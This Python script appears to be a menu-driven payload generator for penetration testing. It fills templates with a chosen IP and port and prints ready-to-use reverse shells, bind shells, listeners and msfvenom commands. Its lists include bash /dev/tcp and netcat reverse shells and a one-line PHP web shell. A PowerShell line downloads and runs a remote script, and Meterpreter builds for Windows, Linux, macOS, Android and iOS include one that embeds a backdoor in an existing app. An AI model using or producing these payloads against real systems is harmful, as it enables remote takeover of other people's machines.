import os

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def logo():
    print(r"""
 ▒█████   ▄████▄   █    ██  ██▓     █    ██   ██████ 
▒██▒  ██▒▒██▀ ▀█   ██  ▓██▒▓██▒     ██  ▓██▒▒██    ▒ 
▒██░  ██▒▒▓█    ▄ ▓██  ▒██░▒██░    ▓██  ▒██░░ ▓██▄   
▒██   ██░▒▓▓▄ ▄██▒▓▓█  ░██░▒██░    ▓▓█  ░██░  ▒   ██▒
░ ████▓▒░▒ ▓███▀ ░▒▒█████▓ ░██████▒▒▒█████▓ ▒██████▒▒
░ ▒░▒░▒░ ░ ░▒ ▒  ░░▒▓▒ ▒ ▒ ░ ▒░▓  ░░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░
  ░ ▒ ▒░   ░  ▒   ░░▒░ ░ ░ ░ ░ ▒  ░░░▒░ ░ ░ ░ ░▒  ░ ░
░ ░ ░ ▒  ░         ░░░ ░ ░   ░ ░    ░░░ ░ ░ ░  ░  ░  
    ░ ░  ░ ░         ░         ░  ░   ░           ░  
         ░                                           
					by 1nn1t
   """)

listeners = [
    ("nc", "nc -nlvp {port}"), ("nc freebsd", "nc -lvn {port}"), ("busybox nc", "busybox nc -lp {port}"), ("ncat", "ncat -lvnp {port}"), ("ncat.exe", "ncat.exe -lvnp {port}"),
    ("ncat (TLS)", "ncat --ssl -lvnp {port}"), ("rlwrap + nc", "rlwrap -cAr nc -lvnp {port}"), ("rustcat", "rcat listen {port}"), ("openssl", "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 30 -nodes; openssl s_server -quiet -key key.pem -cert cert.pem -port {port}"), 
    ("pwncat", "python3 -m pwncat -lp {port}"), ("pwncat (Windows)", "python3 -m pwncat -m windows -lp {port}"), ("windows ConPty", "stty raw -echo; (stty size; cat) | nc -lvnp {port}"), ("socat", "socat -d -d TCP-LISTEN:{port} STDOUT"),
    ("socat (TTY)", "socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:{port}"), ("powercat", "powercat -l -p {port}"), ("msfconsole", "msfconsole -q -x use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost {ip}; set lport {port}; exploit")
]

reverse = [
    ("Bash -i", "{type} -i >& /dev/tcp/{ip}/{port} 0>&1"), ("Bash 196", "0<&196;exec 196<>/dev/tcp/{ip}/{port}; {type} <&196 >&196 2>&196"), ("Bash read line", "exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done"), ("Bash 5", "{type} -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5"), ("Bash udp", "{type} -i >& /dev/udp/{ip}/{port} 0>&1"),
    ("nc mkfifo", "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{type} -i 2>&1|nc {ip} {port} >/tmp/f"), ("nc -e", "nc {ip} {port} -e {type}"), ("nc.exe -e", "nc.exe {ip} {port} -e {type}"), ("BusyBox nc -e", "busybox nc {ip} {port} -e {type}"), ("nc -c", "nc -c {type} {ip} {port}"),
    ("ncat -e", "ncat {ip} {port} -e {type}"), ("ncat.exe -e", "ncat.exe {ip} {port} -e {type}"), ("ncat udp", "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{type} -i 2>&1|ncat -u {ip} {port} >/tmp/f"), ("curl", "C='curl -Ns telnet://{ip}:{port}'; $C </dev/null 2>&1 | {type} 2>&1 | $C >/dev/null"), ("rustcat", "rcat connect -s {type} {ip} {port}"),
    ("OpenSSL", "mkfifo /tmp/s; {type} -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {ip}:{port} > /tmp/s; rm /tmp/s"),
    ("PHP cmd small", "<?=`$_GET[0]`?>"), ("Windows ConPty", "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {ip} {port}"),
    ("socat #1", "socat TCP:{ip}:{port} EXEC:{type}"), ("socat #2 (TTY)", "socat TCP:{ip}:{port} EXEC:'{type}',pty,stderr,setsid,sigint,sane"),
    ("sqlite3 nc mkfifo", "sqlite3 /dev/null '.shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{type} -i 2>&1|nc {ip} {port} >/tmp/f'"), ("node.js #1", "require('child_process').exec('nc -e {type} {ip} {port}')"),
    ("telnet", "TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | {type} 1>$TF"), ("zsh", "zsh -c 'zmodload zsh/net/tcp && ztcp {ip} {port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'")
]

bind = [
    ("nc", "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 {port} > /tmp/f")
]

msfvenom = [
    ("Windows Meterpreter Staged Reverse TCP (x64)", "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe"), ("Windows Meterpreter Stageless Reverse TCP (x64)", "msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe"), ("Windows Staged Reverse TCP (x64)", "msfvenom -p windows/x64/shell/reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe"), ("Windows Stageless Reverse TCP (x64)", "msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe"), ("Windows Staged JSP Reverse TCP", "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f jsp -o ./rev.jsp"), 
    ("Windows Staged ASPX Reverse TCP", "msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f aspx -o reverse.aspx"), ("Windows Staged JSP Reverse TCP (x64)", "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f aspx -o reverse.aspx"), ("Linux Meterpreter Staged Reverse TCP (x64)", "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f elf -o reverse.elf"), ("Linux Stageless Reverse TCP (x64)", "msfvenom -p linux/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f elf -o reverse.elf"), ("Windows Bind TCP ShellCode - BOF", "msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '' -f python -v notBuf -o shellcode"), 
    ("macOS Meterpreter Staged Reverse TCP (x64)", "msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f macho -o shell.macho"), ("macOS Meterpreter Stageless Reverse TCP (x64)", "msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f macho -o shell.macho"), ("macOS Stageless Reverse TCP (x64)", "msfvenom -p osx/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f macho -o shell.macho"),
    ("PHP Meterpreter Stageless Reverse TCP", "msfvenom -p php/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f raw -o shell.php"), ("PHP Reverse PHP", "msfvenom -p php/reverse_php LHOST={ip} LPORT={port} -o shell.php"), ("JSP Stageless Reverse TCP", "msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f raw -o shell.jsp"), ("WAR Stageless Reverse TCP", "msfvenom -p java/shell_reverse_tcp LHOST={ip} LPORT={port} -f war -o shell.war"), ("Android Meterpreter Reverse TCP", "msfvenom --platform android -p android/meterpreter/reverse_tcp lhost={ip} lport={port} R -o malicious.apk"),
    ("Android Meterpreter Embed Reverse TCP", "msfvenom --platform android -x template-app.apk -p android/meterpreter/reverse_tcp lhost={ip} lport={port} -o payload.apk"), ("Apple iOS Meterpreter Reverse TCP Inline", "msfvenom --platform apple_ios -p apple_ios/aarch64/meterpreter_reverse_tcp lhost={ip} lport={port} -f macho -o payload"), ("Python Stageless Reverse TCP","msfvenom -p cmd/unix/reverse_python LHOST={ip} LPORT={port} -f raw"), ("Bash Stageless Reverse TCP","msfvenom -p cmd/unix/reverse_bash LHOST={ip} LPORT={port} -f raw -o shell.sh")
]

def menu(title, options):
    clear()
    logo()
    print(f"{title}\n")
    for i, option in enumerate(options, 1):
        print(f"{i}. {option}")
    choice = input("\nSelect an option: ")
    
    try:
        selected = options[int(choice) - 1]
        return selected
    except (IndexError, ValueError):
        print("Invalid choice. Try again.")
        input("\nPress Enter to return to the menu...")
        return None

def submenu(title, options):
    clear()
    logo()
    print(f"{title}\n")
    for i, option in enumerate(options, 1):
        print(f"{i}. {option[0]}")
    choice = input("\nSelect an option: ")
    
    try:
        selected = options[int(choice) - 1]
        return selected
    except (IndexError, ValueError):
        print("Invalid choice. Try again.")
        input("\nPress Enter to return to the menu...")
        return None

def display(title, options):
    selected = submenu(title, options)
    if selected:
        ip = input("\nProvide an IP address: ")
        port = input("\nProvide a port: ")
        type = input("\nProvide a type: ")
        command = selected[1].format(ip=ip, port=port, type=type)
        print(f"\nFor {selected[0]}: \n{command}")
        input("\nPress Enter to return to the menu...")

def main():
    while True:
        choice = menu("Main Menu", ["Shells", "Listeners"])

        if choice == "Shells":
            shells()
        elif choice == "Listeners":
            display("Listeners Menu", listeners)
        else:
            print("Invalid choice. Try again.")

def shells():
    while True:
        choice = menu("Shells Menu", ["Reverse", "Bind", "msfvenom"])
        
        if choice == "Reverse":
            display("Reverse Menu", reverse)
        elif choice == "Bind":
            display("Bind Menu", bind)
        elif choice == "msfvenom":
            display("msfvenom Menu", msfvenom)
        else:
            print("Invalid choice. Try again.")

if __name__ == "__main__":
    main()
